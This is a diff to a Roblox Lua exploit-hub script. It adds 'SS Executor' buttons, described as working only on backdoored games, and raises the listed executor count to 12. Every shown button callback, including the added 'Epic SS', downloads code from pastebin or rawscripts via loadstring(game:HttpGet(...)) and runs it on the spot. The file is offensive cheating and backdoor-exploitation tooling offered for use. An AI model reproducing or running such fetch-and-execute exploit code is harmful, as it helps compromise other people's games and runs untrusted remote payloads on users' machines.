@@ -19,7 +19,6 @@ print("---------------------------------------")
 print("[The One Who Make Me Smile Everytime🙂]")
 print("------------->Fuvv4_w1nnn<------------")
 
-
 -- Orion Library --
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/DenDenZZZ/Orion-UI-Library/refs/heads/main/source')))()
 -- Make Main Tab --
@@ -2816,9 +2815,9 @@ local Section = Tab:AddSection({
 })
 
 Tab:AddParagraph("-- > SS Executor <--","Only Work On Backdoor Games")
-Tab:AddLabel("Total SS Executor : 9")
+Tab:AddLabel("Total SS Executor : 12")
 Tab:AddLabel("Status : 🟢")
-Tab:AddParagraph("Correct SS Executor Working : 9 🟢","Correct SS Executor Not Working : 0 🔴")
+Tab:AddParagraph("Correct SS Executor Working : 12 🟢","Correct SS Executor Not Working : 0 🔴")
 
 Tab:AddButton({
     Name = "LALOL Hub (backdoor scanner and executor)",
@@ -2889,6 +2888,19 @@ Tab:AddButton({
     Name = "L00wkidd SS",
     Callback = function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Server-side-skip-by-team-l00wkidd-23969"))()
+        OrionLib:MakeNotification({
+            Name = "Projects Cookies 🍪 || Creator Message🌐",
+            Content = "Successfully executed!",
+            Image = "rbxassetid://7733993369",
+            Time = 3
+        })
+    end    
+})
+
+Tab:AddButton({
+    Name = "Epic SS",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/K79NtXL1"))();
         OrionLib:MakeNotification({
             Name = "Projects Cookies 🍪 || Creator Message🌐",
             Content = "Successfully executed!",
